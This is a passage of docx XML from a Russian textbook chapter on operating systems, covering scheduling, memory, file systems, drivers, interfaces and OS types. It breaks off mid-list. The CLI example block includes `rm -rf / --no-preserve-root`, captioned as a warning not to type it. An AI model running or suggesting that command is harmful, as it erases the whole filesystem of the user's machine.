    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает ОС:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Создание и уничтожение процессов**: запускает программу, выделяет ей память, завершает её, когда она закончилась (или зависла).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Планирование (Scheduling)**: решает, какой процесс будет выполняться на процессоре в данный момент. У тебя 100 процессов, но только 8 ядер процессора — ОС переключается между процессами тысячи раз в секунду, создавая иллюзию, что все работают одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многозадачность (Multitasking)**: одновременное выполнение нескольких программ. Бывает **вытесняющая** (preemptive) — ОС насильно отбирает процессор у одной программы и отдаёт другой, и **невытесняющая** (cooperative) — программа сама должна отдать управление (древний Windows 3.1 работал так, одна зависшая программа клала всю систему).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ты запустил игру, браузер, Telegram и Spotify. Процессор Intel i7 (8 ядер, 16 потоков) физически может выполнять 16 задач одновременно. Но у тебя 200 процессов в диспетчере задач. ОС переключается между ними каждые </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10-100 миллисекунд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (time slice, квант времени). Для тебя это выглядит, как будто всё работает параллельно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Управление памятью (Memory Management)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> распределить оперативную память (RAM) между всеми процессами так, чтобы они не мешали друг другу и не крашили систему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает ОС:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Выделение и освобождение памяти**: программа запросила 100 MB — ОС выделяет. Программа закрылась — ОС освобождает память.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальная память (Virtual Memory)**: у тебя 16 GB RAM, но система позволяет процессам думать, что у каждого есть терабайты памяти. Как? **Подкачка страниц** (paging): если память кончилась, ОС сбрасывает редко используемые данные на диск (файл подкачки, swap) и подгружает обратно, когда нужно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита памяти**: один процесс не может залезть в память другого процесса (это называется **изоляция адресных пространств**). Иначе был бы ад: одна программа случайно перезаписала данные другой, и всё сломалось.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример виртуальной памяти:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У тебя 16 GB RAM. Запустил Photoshop (съел 8 GB), Chrome с 50 вкладками (ещё 6 GB), игру (4 GB). Итого: 18 GB. Но памяти только 16 GB. ОС выгружает на диск неиспользуемые данные Chrome (ты давно не смотрел вкладку "Как варить гречку"), освобождая 2 GB. Когда переключишься обратно на вкладку — ОС подгрузит данные с диска. Медленнее, зато не краш.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Страничная организация памяти:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> память делится на блоки фиксированного размера — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>страницы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (обычно 4 KB). Процесс работает с виртуальными адресами, а ОС переводит их в физические адреса через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>таблицу страниц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Page Table). Это основа виртуальной памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Управление файловой системой (File System Management)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файловая система (FS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способ организации данных на диске. Без неё диск — это просто куча нулей и единиц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает ОС:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создание, чтение, запись, удаление файлов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Организация файлов в иерархию директорий (папок).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Управление правами доступа (кто может читать/писать файл).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Журналирование (journaling) — запись всех операций с файлами, чтобы восстановить данные после краша.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные файловые системы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| ФС      | Используется в  | Макс. размер файла | Журналирование | Особенности                              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|----------------|--------------------|----------------|------------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FAT32</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | USB-флешки, старые Windows | 4 GB               | Нет            | Совместима с любой ОС, но ограничения древние |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NTFS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Windows        | 16 EB (экзабайт)   | Да             | Права доступа, шифрование, сжатие        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ext4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Linux          | 16 TB              | Да             | Быстрая, надёжная, стандарт для Linux    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>APFS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | macOS, iOS     | 8 EB               | Да             | Оптимизирована под SSD, снапшоты         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Btrfs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Linux (новая)  | 16 EB              | Да             | Copy-on-write, снапшоты, RAID            |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Скачал файл размером 5 GB. FAT32 не поддерживает файлы больше 4 GB, система выдаст ошибку. Нужно переформатировать флешку в exFAT или NTFS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Управление устройствами ввода-вывода (I/O Device Management)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компьютер взаимодействует с кучей устройств: клавиатура, мышь, диски, принтеры, сетевые карты, веб-камеры. ОС управляет всем этим зоопарком через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>драйверы</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Драйвер (Driver)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа, которая знает, как общаться с конкретным устройством. Например, драйвер видеокарты NVIDIA переводит команды DirectX в инструкции для GPU.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делает ОС:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Загружает драйверы устройств.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Предоставляет единый интерфейс для доступа к устройствам (программа не должна знать, как работает жёсткий диск — она просто вызывает функцию `read()`, а ОС разбирается с деталями).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Буферизация и кэширование данных ввода-вывода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Подключил принтер HP. Windows автоматически скачивает драйвер из интернета. Linux может сказать: "Принтер? Не, не слышал." И тебе придётся искать драйвер вручную (или мучиться с CUPS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Пользовательский интерфейс (User Interface)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ОС предоставляет интерфейс для взаимодействия с компьютером. Бывает двух типов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CLI (Command Line Interface)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — командная строка. Вводишь команды текстом:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ ls -la</w:t>
        <w:br/>
        <w:t>$ cd /home/user/documents</w:t>
        <w:br/>
        <w:t>$ rm -rf / --no-preserve-root   # не вводи это!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> быстро, гибко, автоматизируется (скрипты).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> нужно помнить команды, не интуитивно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Bash (Linux), PowerShell (Windows), Zsh (macOS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GUI (Graphical User Interface)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — графический интерфейс. Окна, кнопки, мышка.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> интуитивно, красиво, удобно для новичков.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> медленнее, жрёт ресурсы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Windows 11 (Metro UI), macOS (Aqua), GNOME/KDE (Linux).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Серверы обычно используют CLI, потому что GUI — лишняя нагрузка. Зачем серверу красивые окошки, если он стоит в тёмном дата-центре без монитора?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1.2. Классификация операционных систем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ОС бывают разные. Разберём основные критерии классификации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По назначению</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Серверные ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> обслуживать множество клиентов одновременно (веб-серверы, базы данных, файловые хранилища).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Высокая надёжность (uptime 99.99%).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многопользовательский режим.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация под сетевые задачи и дисковые операции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux** (Ubuntu Server, CentOS, Debian, Red Hat Enterprise Linux) — 96% веб-серверов работают на Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows Server** — для корпораций, Active Directory, Exchange.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FreeBSD** — популярна в Netflix (стриминг видео).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Настольные (Desktop) ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работа одного пользователя с персональным компьютером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Графический интерфейс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка мультимедиа (игры, видео, музыка).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большой выбор приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows** (10, 11) — доля рынка ~70% (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS** (Sequoia, Sonoma) — ~15%, популярна среди дизайнеров и программистов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux** (Ubuntu, Fedora, Linux Mint) — ~3%, но растёт (особенно после Steam Deck).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Мобильные ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> смартфоны и планшеты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация под энергопотребление (батарея).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сенсорный интерфейс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ограничения безопасности (песочница для приложений).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Android** (Google) — 70% рынка, открытая ОС на базе Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**iOS** (Apple) — 28% рынка, закрытая ОС.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HarmonyOS** (Huawei) — растущая альтернатива в Китае.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Встраиваемые ОС (Embedded)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> управление встраиваемыми системами (бытовая техника, автомобили, роутеры).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальный размер (килобайты-мегабайты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация под конкретную задачу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работа на слабом железе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Embedded Linux** — используется в роутерах, смарт-ТВ, автомобилях Tesla.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**QNX** — в автомобильных системах (Audi, BMW, Ford).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VxWorks** — в авионике (Boeing 787, марсоход Curiosity).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>ОС реального времени (RTOS, Real-Time OS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> задачи, где критична </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>предсказуемость времени отклика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (не скорость, а гарантия, что задача выполнится за определённый срок).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Жёсткое реальное время (Hard Real-Time):** задача должна выполниться строго за заданное время. Опоздание = катастрофа.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: система управления двигателем самолёта. Если команда на изменение тяги задержится на 10 мс — самолёт упадёт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мягкое реальное время (Soft Real-Time):** задержки нежелательны, но не критичны.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: стриминг видео. Если кадр задержится на 50 мс — заметишь лаг, но ничего не сломается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FreeRTOS** — бесплатная RTOS для микроконтроллеров (используется в IoT).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VxWorks** — коммерческая RTOS (космос, оборона).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**QNX** — в автомобилях и медицинских устройствах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Система подушек безопасности в автомобиле. При аварии сенсоры определяют удар, и подушка должна раскрыться за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10-20 миллисекунд</w:t>
      </w:r>
      <w:r>
        <w:t>. Если ОС задержит обработку на 50 мс — подушка раскроется после того, как водитель уже ударился о руль. RTOS гарантирует, что критичная задача выполнится вовремя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По архитектуре ядра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ядро (Kernel)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сердце ОС. Оно работает в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>привилегированном режиме</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (kernel mode) и имеет полный доступ к железу. Пользовательские программы работают в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пользовательском режиме</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (user mode) и обращаются к железу только через системные вызовы (system calls).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Есть три основных архитектуры ядра:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Монолитное ядро (Monolithic Kernel)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Весь код ядра работает в одном адресном пространстве. Все компоненты (управление процессами, памятью, файлами, драйверы) — часть ядра.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: нет накладных расходов на передачу данных между модулями.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность: прямой доступ к железу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
